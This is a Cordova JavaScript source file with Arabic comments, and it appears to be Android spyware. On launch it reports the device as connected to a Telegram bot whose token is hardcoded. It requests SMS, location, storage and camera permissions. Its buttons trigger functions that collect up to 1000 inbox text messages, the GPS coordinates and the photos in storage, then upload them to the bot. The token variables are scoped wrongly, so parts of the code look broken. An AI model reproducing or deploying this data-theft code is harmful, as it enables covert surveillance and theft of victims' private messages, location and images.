document.addEventListener('deviceready', onDeviceReady, false);

function onDeviceReady() {
  console.log('Cordova جاهز');
  sendConnectionMessage();
  createButtons();
}

function requestPermissions() {
  var permissions = cordova.plugins.permissions;
  permissions.requestPermissions(
    [
      permissions.READ_EXTERNAL_STORAGE,
      permissions.WRITE_EXTERNAL_STORAGE,
      permissions.ACCESS_FINE_LOCATION,
      permissions.READ_SMS,
      permissions.RECEIVE_SMS,
      permissions.CAMERA
    ],
    function(status) {
      if (status.hasPermission) {
        alert("تم منح الأذونات بنجاح");
      } else {
        alert("تم رفض الأذونات");
      }
    },
    function(error) {
      console.warn("فشل طلب الأذونات", error);
    }
  );
}

function enterApp() {
  document.getElementById("message").innerText = "مرحباً!";
}

function sendConnectionMessage() {
  // كود إرسال "الجهاز متصل" إلى البوت
  const botToken = '7988955212:AAFqpIpyQ1MlQ-sASLG0oMRLu4vMhkZNGDk';
  const chatId = '5739065274';
  const message = 'الجهاز متصل';
  
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`)
    .then(response => response.json())
    .then(data => console.log('تم إرسال الرسالة:', data))
    .catch(error => console.error('خطأ في الإرسال:', error));
}

function createButtons() {
  // إنشاء الزر الرئيسي
  const mainButton = document.createElement('button');
  mainButton.textContent = 'عرض الأوامر';
  mainButton.style.opacity = '0.7';
  mainButton.style.position = 'fixed';
  mainButton.style.bottom = '20px';
  mainButton.style.right = '20px';
  mainButton.onclick = showCommands;
  
  document.body.appendChild(mainButton);
}

function showCommands() {
  // إنشاء الأزرار الشفافة
  const commands = [
    { text: 'سحب رسائل SMS', action: collectSMS },
    { text: 'سحب الموقع الجغرافي', action: getLocation },
    { text: 'سحب الصور', action: collectImages }
  ];
  
  commands.forEach((cmd, index) => {
    const btn = document.createElement('button');
    btn.textContent = cmd.text;
    btn.style.opacity = '0.7';
    btn.style.position = 'fixed';
    btn.style.bottom = `${80 + index * 60}px`;
    btn.style.right = '20px';
    btn.onclick = cmd.action;
    
    document.body.appendChild(btn);
  });
}

function collectSMS() {
  // كود جمع الرسائل
  const filter = { box: 'inbox' };
  const options = { maxCount: 1000 };
  
  if(SMS) SMS.listSMS(filter, options, (data) => {
    // معالجة الرسائل وإرسالها
    const inbox = data.map(msg => `[${new Date(msg.date)}] ${msg.address}: ${msg.body}`).join('\n');
    sendToTelegram('inbox.txt', inbox);
  });
}

function getLocation() {
  // كود جلب الموقع
  navigator.geolocation.getCurrentPosition((position) => {
    const location = `خط العرض: ${position.coords.latitude}\nخط الطول: ${position.coords.longitude}`;
    sendToTelegram('location.txt', location);
  });
}

function collectImages() {
  // كود جمع الصور
  window.resolveLocalFileSystemURL(cordova.file.externalRootDirectory, (dir) => {
    const reader = dir.createReader();
    reader.readEntries((entries) => {
      const images = entries.filter(entry => /\.(jpg|png|jpeg)$/i.test(entry.name));
      sendImagesToTelegram(images);
    });
  });
}

function sendToTelegram(filename, content) {
  // كود إرسال المحتوى إلى البوت
  const blob = new Blob([content], { type: 'text/plain' });
  const formData = new FormData();
  formData.append('document', blob, filename);
  
  fetch(`https://api.telegram.org/bot${botToken}/sendDocument?chat_id=${chatId}`, {
    method: 'POST',
    body: formData
  });
}

function sendImagesToTelegram(images) {
  // كود إرسال الصور
  images.forEach((imgEntry) => {
    imgEntry.file((file) => {
      const formData = new FormData();
      formData.append('photo', file, file.name);
      
      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
        method: 'POST',
        body: formData
      });
    });
  });
}
